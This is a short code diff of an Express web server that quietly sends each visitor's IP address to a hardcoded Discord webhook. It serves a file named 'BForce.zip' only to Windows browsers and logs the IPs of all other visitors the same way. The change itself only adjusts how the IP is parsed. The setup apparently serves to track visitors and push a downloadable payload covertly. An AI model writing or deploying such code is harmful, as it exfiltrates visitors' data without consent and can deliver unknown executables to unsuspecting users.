@@ -8,7 +8,7 @@ const wh = 'https://discord.com/api/webhooks/832118860631113758/-_y-wGd6bNGXD-De
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '/index.html'));
-    ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',').reverse()[0])
+    ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress))
     fetch(wh, {
         method: 'post',
         headers: { 'Content-Type': 'application/json' },
@@ -20,7 +20,7 @@ app.all('/static/bin/BForce.zip', (req, res) => {
     if (req.headers['user-agent'].includes("(Windows"))
         res.sendFile(path.join(__dirname, '/static/bin/BForce.zip'));
     else {
-        ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',').reverse()[0])
+        ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress))
         fetch(wh, {
             method: 'post',
             headers: { 'Content-Type': 'application/json' },
